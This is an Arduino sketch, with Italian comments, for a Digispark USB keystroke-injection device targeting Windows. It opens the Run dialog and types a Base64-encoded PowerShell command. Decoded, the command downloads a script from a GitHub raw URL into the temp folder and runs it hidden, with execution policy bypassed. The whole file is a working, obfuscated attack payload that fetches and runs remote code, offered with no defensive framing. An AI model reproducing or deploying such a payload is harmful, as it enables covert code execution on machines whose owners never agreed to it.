#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // Apri Esegui (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell.exe "));
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_SLASH);
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("encodedCommand "));
  DigiKeyboard.delay(100);

  // Spezziamo il Base64 in pezzi < 64 byte ciascuno
  DigiKeyboard.print(F("KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBl"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("AG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAA"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("cwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABl"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("AG4AdAAuAGMAbwBtAC8ATgBpAGMAbwBsAGEATABlAHAAbwByAGUANAAvAEQA"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("aQBnAGkALQBzAG8AdQBuAGQAcwAvAG0AYQBpAG4ALwBzAGMAcgBpAHAAdAAu"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("AHMAaAAnACwAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwBjAHIAaQBwAHQA"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("LgBwAHMAMQAiACkAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABw"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("AG8AdwBlAHIAcwBoAGUAbABsACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMA"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("dAAgACcALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBw"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("AGEAcwBzACAALQBGAGkAbABlACcALAAgACIAJABlAG4AdgA6AFQARQBNAFAA"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("XABzAGMAcgBpAHAAdAAuAHAAcwAxACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5"));
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("AGwAZQAgAEgAaQBkAGQAZQBuAA"));
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // non serve
}
